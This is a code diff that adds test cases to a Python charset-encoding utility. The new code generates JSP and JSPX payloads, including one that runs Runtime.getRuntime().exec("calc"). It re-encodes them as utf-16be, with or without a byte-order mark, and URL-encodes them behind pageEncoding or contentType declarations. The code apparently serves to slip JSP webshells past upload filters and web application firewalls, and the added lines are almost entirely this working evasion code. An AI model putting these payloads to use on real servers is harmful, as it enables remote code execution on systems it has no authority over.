@@ -152,5 +152,37 @@ class Charset:
 
 if __name__ == '__main__':
     charset= "utf-16be"
+    data = '''<?xml version="1.0" encoding="{charset}"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"
+  version="1.2">
+<jsp:directive.page contentType="text/html"/>
+<jsp:declaration>
+</jsp:declaration>
+<jsp:scriptlet>
+out.write("I'm turn1tup!");
+</jsp:scriptlet>
+<jsp:text>
+</jsp:text>
+</jsp:root>
+'''.format(charset=charset)
+    print((Charset.set_str_charset(data, charset=charset,remove_bom=True,resulst_data_format_func=DataEncoder.URL_ENCODE)))
     
+    charset= "utf-16be"
+    data = '''<% out.write("I\'m turn1tup!"); %>'''.format(charset=charset)
+    print((Charset.set_str_charset(data, charset=charset,remove_bom=True,resulst_data_format_func=DataEncoder.URL_ENCODE)))
+
+    data='''<% out.write("I\'m turn1tup!"); out.print(Runtime.getRuntime().exec("calc")); %>'''
+    declare = '<%@ page pageEncoding="{charset}"%>'.format(charset=charset)
+    data = declare + (Charset.set_str_charset(data, charset=charset, remove_bom=True,
+                                   resulst_data_format_func=DataEncoder.URL_ENCODE))
     print(data)
+
+    data='''<% out.write("I\'m turn1tup!"); out.print(Runtime.getRuntime().exec("calc")); %>'''
+    declare = '<%@ page contentType="charset={charset}" %>'.format(charset=charset)
+    data = declare + (Charset.set_str_charset(data, charset=charset, remove_bom=True,
+                                   resulst_data_format_func=DataEncoder.URL_ENCODE))
+    print(data)
+
+    charset= "utf-16be"
+    data = '''<% out.write("I\'m turn1tup!"); %>'''.format(charset=charset)
+    print((Charset.set_str_charset(data, charset=charset,remove_bom=False,resulst_data_format_func=DataEncoder.URL_ENCODE)))
